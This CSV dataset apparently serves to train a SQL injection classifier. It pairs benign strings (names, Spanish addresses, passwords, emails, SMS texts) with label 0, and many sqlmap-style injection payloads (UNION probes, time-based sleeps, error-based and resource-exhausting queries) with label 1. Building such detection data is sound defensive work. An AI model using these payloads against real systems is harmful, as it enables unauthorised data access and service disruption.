payload,label
oviedo,0
"-8121))) OR ELT(1464=1808,1808) AND (((7645=7645",1
1' and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and 'fbzo' like 'fbzo,1
')) AND 6207=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (6207=6207) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AND (('ZoQf' LIKE 'ZoQf,1
"1' )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  ( 'jvll' like 'jvll",1
berroteran,0
"-5932"")) UNION ALL SELECT 5136,5136,5136-- kSVC",1
26586,0
kindelan,0
-9429') order by 1--,1
"cbHd') WHERE 2784=2784 AND CHAR(97)||CHAR(101)||CHAR(75)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL)--",1
-1011 or 7140=9977--,1
oestreic,0
"calle valencia de don juan 161, 7?d",0
"1')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('vwxg'='vwxg",1
"sqlmap/1.4.4#stable (http://sqlmap.org)'))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
sexC||(SELECT ZJMV FROM DUAL WHERE 1243=1243 OR 9127=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR))||,1
92624028s,0
su7r5orato,0
sexC') WHERE 1689=1689 OR SLEEP(5)-- dAdH,1
"-6349') UNION ALL SELECT 7397,7397,7397,7397,7397,7397,7397,7397,7397,7397,7397,7397,7397,7397,7397,7397,7397#",1
"-4652"") UNION ALL SELECT 3143,3143,3143,3143,3143,3143,3143,3143#",1
"cbHd) WHERE 8841=8841 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(2158=2158,1))),0x716a786a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- VzIS",1
"-9747 UNION ALL SELECT 4168,4168,4168,4168,4168,4168,4168,4168,4168,4168,4168,4168,4168,4168,4168,4168,4168,4168,4168,4168,4168,4168,4168,4168,4168,4168#",1
plymouth,0
krug sabet,0
boyadgian@campanasextractoras.tv,0
"1 )  where 3076 = 3076 union all select null,null,null,null,null--",1
hoeflich@movil-google.cx,0
"1'+(select byor where 4538=4538;call regexp_substring(repeat(right(char(3702),0),500000000),null))+'",1
cang,0
"1"" )  and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and  ( ""pdsy"" like ""pdsy",1
"-7482""))) or 9077=2651",1
"-9130 UNION ALL SELECT 1151,1151,1151,1151,1151,1151,1151,1151,1151,1151,1151#",1
hamlet,0
"cbHd"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
""" AND 1297=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (1297=1297) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)))-- hsun",1
ogassa,0
"-9062' IN BOOLEAN MODE) UNION ALL SELECT 7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507,7507-- UZxO",1
"My planning usually stops at ""find hella weed smoke hella weed""",0
"1'+ ( select 'ewlk' where 1078 = 1078 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
') AND 4245=2038#,1
"-6604"") UNION ALL SELECT 7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957,7957-- BeSJ",1
"||(SELECT MHTn FROM DUAL WHERE 8006=8006 OR 3992=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3))||",1
"-1362)) UNION ALL SELECT 8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430,8430#",1
gunderso,0
"-3585') UNION ALL SELECT 6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301,6301-- pCRw",1
"DtRW))) AND CHAR(85)||CHAR(112)||CHAR(68)||CHAR(107)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9820),0),5000000000),NULL)--",1
1esa0o401m0en7o,0
"1, ( select  ( case when  ( 7616 = 7616 )  then 1 else 1/ ( select 0 )  end  )  )  ",1
q123456789,0
29091987,0
Anything lor. Juz both of us lor.,0
vUXo||(SELECT (CHR(114)||CHR(83)||CHR(111)||CHR(67)) FROM DUAL WHERE 2624=2624 OR NOT 8214=5252)||,1
chavis,0
puck,0
"-7152"" OR ELT(7437=3200,3200) AND ""Xnuv""=""Xnuv",1
co5r5525e,0
"')) AS PIWS WHERE 4424=4424 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
topper,0
3099595340897586,0
"vyHv') OR CHAR(116)||CHAR(102)||CHAR(105)||CHAR(98)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3539),0),5000000000),NULL) AND ('LMJY'='LMJY",1
"cbHd` WHERE 6689=6689 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- GIzs",1
aylmar6,0
-4543 OR 4562 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (4562=4562) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113)))# XWaQ,1
"-8577"" OR 5484=CAST((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (5484=5484) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC) AND ""kkzk"" LIKE ""kkzk",1
"pl. santa ana, 97,",0
neils,0
I want to be there so i can kiss you and feel you next to me,0
Bring it if you got it,0
""")) AS ErJV WHERE 7141=7141 AND (SELECT (CASE WHEN (2084=9514) THEN NULL ELSE CAST((CHR(117)||CHR(87)||CHR(85)||CHR(67)) AS NUMERIC) END)) IS NULL-- IdCu",1
"vyHv' IN BOOLEAN MODE) AND 7661=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--",1
thirugna,0
cervera de la caada,0
"-5853 UNION ALL SELECT 7574,7574,7574,7574,7574,7574,7574,7574,7574,7574,7574,7574,7574,7574,7574,7574,7574,7574,7574,7574,7574,7574-- YVgp",1
sergeant,0
"-6125"" UNION ALL SELECT 6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875,6875#",1
sandy1,0
"DtRW UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- NOVE",1
26520,0
""") AS lcpT WHERE 2399=2399 AND 8066=CAST((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (8066=8066) THEN BITCOUNT(BITSTRING_TO_BINARY((CHR(49)))) ELSE BITCOUNT(BITSTRING_TO_BINARY((CHR(48)))) END))::varchar||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC)-- pvdA",1
"-1593' or elt ( 7044 = 6125,6125 )  and 'zkuz' = 'zkuz",1
1399422098640864,0
clovis,0
"https://keystrokebiometrics.xyz:443/'))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- gcxK",1
Ok. I only ask abt e movie. U wan ktv oso?,0
100500,0
"-1045""))) UNION ALL SELECT 2912,2912,2912,2912,2912,2912,2912,2912,2912,2912,2912,2912,2912,2912,2912,2912,2912,2912,2912,2912,2912,2912,2912#",1
poncho,0
https://keystrokebiometrics.xyz:443/` WHERE 4496=4496 OR 3140=(SELECT 3140 FROM PG_SLEEP(5))--,1
"vyHv' IN BOOLEAN MODE) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"-6773"") UNION ALL SELECT 2620,2620,2620,2620,2620,2620,2620,2620,2620,2620,2620,2620,2620,2620,2620,2620,2620,2620,2620,2620#",1
"-7433' UNION ALL SELECT 4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592,4592#",1
nastya,0
"+(SELECT EtpS WHERE 3269=3269 OR ROW(3959,3860)>(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(3959=3959,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM (SELECT 3610 UNION SELECT 3743 UNION SELECT 3300 UNION SELECT 1420)a GROUP BY x))+",1
"DtRW) WHERE 4095=4095 OR 1916=BENCHMARK(5000000,MD5(0x4a6b7470))#",1
1796108365949620,0
"1'||(select 'jlka' where 5436=5436 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
mame,0
""" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(8662=8662,1))),0x716a786a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- LqDl",1
50245802w,0
"Best line said in Love: . ""I will wait till the day I can forget u Or The day u realize that u cannot forget me.""... Gn",0
DtRW' WHERE 9501=9501 AND 8723=CAST((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (8723=8723) THEN BITCOUNT(BITSTRING_TO_BINARY((CHR(49)))) ELSE BITCOUNT(BITSTRING_TO_BINARY((CHR(48)))) END))::varchar||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC)-- OmLv,1
cele959n3s0o,0
"-4896') UNION ALL SELECT 4656,4656,4656,4656,4656,4656,4656,4656,4656,4656,4656,4656,4656,4656,4656,4656,4656-- AlAT",1
56702228y,0
"https://keystrokebiometrics.xyz:443/' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- lzne",1
DtRW` WHERE 3116=3116 WAITFOR DELAY '0:0:5'--,1
68m+b11n,0
12005174w,0
"-1209'))) UNION ALL SELECT 7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904,7904#",1
36824115b,0
"' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(8493=8493,1))),0x716a786a71,0x78))x)) AND 'nHuq' LIKE 'nHuq",1
06700,0
' WHERE 1731=1731 AND 6213=(SELECT (CASE WHEN (6213=8332) THEN 6213 ELSE (SELECT 8332 UNION SELECT 5695) END))-- YPzs,1
pulsmetro,0
ginest baquedano,0
atanasio menendez s/n,0
chabert,0
45295566x,0
"segura 30,",0
"' OR ELT(9465=9465,SLEEP(5))-- orac",1
-8990 ORDER BY 1100#,1
"` WHERE 2864=2864 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
calle san juan 151 1e,0
soria,0
vogin,0
"https://keystrokebiometrics.xyz:443/' OR 8052=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) OR 'SkXl'='yMiB",1
"TAAm"")))(SELECT (CASE WHEN (1447=1447) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(1447),0),500000000),NULL) ELSE CHAR(104)||CHAR(71)||CHAR(85)||CHAR(82) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND (((""tguH"" LIKE ""tguH",1
"TAAm') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"DtRW"" OR NOT 8844=8794#",1
q1w2e3,0
55540530s,0
5855,0
"-1321) AS dRWD WHERE 8533=8533 UNION ALL SELECT 8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533,8533-- fKIS",1
"-7441"" UNION ALL SELECT 6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263,6263#",1
"-5892')) AS eZfQ WHERE 9259=9259 OR ELT(5983=5983,7008)-- yeAt",1
santasus quirce,0
29109,0
https://keystrokebiometrics.xyz:443/'||(SELECT 0x4e4f546b WHERE 5415=5415 RLIKE (SELECT 7960 FROM (SELECT(SLEEP(5)))Pvnn)#,1
"-9511' UNION ALL SELECT 5726,5726,5726,5726#",1
1'  )  )   ) ,1
1%') or sleep(5)#,1
22111985,0
"sqlmap/1.4.4#stable (http://sqlmap.org) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
select case when 8867 = 7630 then 1 else null end--,1
olivieri_needham@escuelamontessori.us,0
89687602e,0
"TAAm')) AS qakl WHERE 7324=7324 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
That day ü say ü cut ur hair at paragon is it called hair sense? Do ü noe how much is a hair cut? ,0
"')) AS APKl WHERE 1778=1778 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
73002359z,0
llull valls,0
maxxxx,0
bizantina,0
"-2014') UNION ALL SELECT 2008,2008,2008,2008,2008,2008,2008,2008,2008,2008,2008,2008,2008,2008,2008,2008#",1
"cbHd"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- jJFb",1
fresia,0
"cbHd' IN BOOLEAN MODE) OR 1261=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)--",1
2753394337556822,0
9032865306182152,0
llobet garrido,0
"sqlmap/1.4.4#stable (http://sqlmap.org)' OR 3019=BENCHMARK(5000000,MD5(0x4241674e))-- tbSz",1
"sqlmap/1.4.4#stable (http://sqlmap.org)) AS HCGA WHERE 8686=8686 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- SFcl",1
marcelo,0
01031983,0
salem,0
psitacosis,0
marra,0
los polancos 133,0
1846096870233397,0
"-5078 union all select 9708,9708--",1
caravaca de la cruz,0
"cbHd AND UPDATEXML(7500,CONCAT(0x2e,0x7176707171,(SELECT (ELT(7500=7500,1))),0x716a786a71),7878)# yhNA",1
65781436x,0
"https://keystrokebiometrics.xyz:443/') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"pl. zorrilla 110,",0
"cbHd""))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- lrtc",1
"sexC' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- cyus",1
azema.alvir@telogis.gf,0
"calle carme karr, 65, 10a",0
TAAm') AND 3869=(ASCII_CHAR(113)||ASCII_CHAR(118)||ASCII_CHAR(112)||ASCII_CHAR(113)||ASCII_CHAR(113)||(SELECT CASE 3869 WHEN 3869 THEN 1 ELSE 0 END FROM RDB$DATABASE)||ASCII_CHAR(113)||ASCII_CHAR(106)||ASCII_CHAR(120)||ASCII_CHAR(106)||ASCII_CHAR(113)) AND ('kDlX' LIKE 'kDlX,1
"-9815"") UNION ALL SELECT 9355,9355#",1
"DtRW""))) PROCEDURE ANALYSE(EXTRACTVALUE(1454,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x7a434470))))),1)#",1
3497,0
fletcher,0
sot143a82,0
"') AS Anih WHERE 4489=4489 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Iamk",1
"vyHv') AS zBaQ WHERE 8564=8564 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
studly,0
"c/ conquista 94, 1?c",0
"TAAm"")) AS ZoJq WHERE 7323=7323 WAITFOR DELAY '0:0:5'-- MEOv",1
villalobn,0
slipknot,0
52984297w,0
"1 and make_set(9542=8888,8888)-- idkn",1
Hey sathya till now we dint meet not even a single time then how can i saw the situation sathya.,0
"TAAm' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"TAAm') OR CHAR(99)||CHAR(106)||CHAR(98)||CHAR(69)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(1292),0),5000000000),NULL) AND ('KYzP'='KYzP",1
52438346w,0
miles_detmers@sotelink.vu,0
1)) as svhd where 9761=9761;select case when 7717=7717 then 1 else null end--,1
-2981  )  )   or  ( 8459 = 8459 ) *4906 and   (  (  4202 = 4202,1
arraia-maeztu,0
hormachea vilamasa,0
"-6618' UNION ALL SELECT 5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089,5089-- GWis",1
"TAAm') AS otjr WHERE 5032=5032 AND 1315=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)--",1
"-8095"")) UNION ALL SELECT 8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816,8816#",1
1'))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('gegg'='gegg,1
"-3347'+(select xuzs where 1076=1076 union all select 1076,1076,1076,1076,1076--",1
49240,0
28530,0
"1"" )  or sleep ( 5 ) #",1
"-2419) AS jyWe WHERE 3436=3436 UNION ALL SELECT 3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436,3436-- jwML",1
https://keystrokebiometrics.xyz:443/') AND 4763 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (4763=4763) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113))) AND ('CWur' LIKE 'CWur,1
Yeah sure give me a couple minutes to track down my wallet,0
"vyHv+(SELECT tmJd WHERE 2223=2223 OR 1601=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)--",1
spence,0
DtRW||(SELECT CODE(88)||CODE(117)||CODE(65)||CODE(114) WHERE 3009=3009 AND 4343=(CODE(113)||CODE(118)||CODE(112)||CODE(113)||CODE(113)||(SELECT CASE 4343 WHEN 4343 THEN CODE(49) ELSE CODE(48) END)||CODE(113)||CODE(106)||CODE(120)||CODE(106)||CODE(113)))||,1
raha,0
acombar,0
"https://keystrokebiometrics.xyz:443/' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(6653=6653,1))),0x716a786a71,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'gDzI' LIKE 'gDzI",1
"-1719"")) AS Pkmu WHERE 4833=4833 UNION ALL SELECT 4833,4833,4833,4833,4833,4833-- DYSr",1
""") AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(2558=2558,1))),0x716a786a71,0x78))x)) AND (""OyGG"" LIKE ""OyGG",1
stinton@sms24h.dk,0
c/ san quintin 104 8-b,0
This is the 2nd time we have tried 2 contact u. U have won the 750 Pound prize. 2 claim is easy call 08712101358 NOW! Only 10p per min. BT-national-rate,0
-4313) OR 6772 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (6772=6772) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113)))-- bulo,1
"https://keystrokebiometrics.xyz:443/"" WHERE 3211=3211 OR UPDATEXML(3671,CONCAT(0x2e,0x7176707171,(SELECT (ELT(3671=3671,1))),0x716a786a71),7653)-- Rkaq",1
cowboys1,0
grimm@madrid2012.nu,0
"-6660 WHERE 3682=3682 OR 9927=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (9927=9927) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113)))-- RrVf",1
44,0
Poyyarikaturkolathupalayamunjalur posterode dis &lt;#&gt; .,0
"vyHv'+(SELECT 0x7343744d WHERE 1328=1328 AND ELT(7007=7007,SLEEP(5)))+'",1
"OR 2697=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)# mKMi",1
pello melo,0
"'||(SELECT CHAR(70)||CHAR(106)||CHAR(104)||CHAR(118) FROM DUAL WHERE 5398=5398 AND CHAR(118)||CHAR(97)||CHAR(101)||CHAR(119)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL))||'",1
quismondo,0
analfabetismo,0
40139732v,0
"'))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
16061985,0
"""))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(8493=8493,1))),0x716a786a71,0x78))x)) AND (((""vPOM"" LIKE ""vPOM",1
"calle poador, 65 3a",0
p0o9i8u7,0
"sqlmap/1.4.4#stable (http://sqlmap.org) OR ELT(5689=5689,SLEEP(5))-- cmKI",1
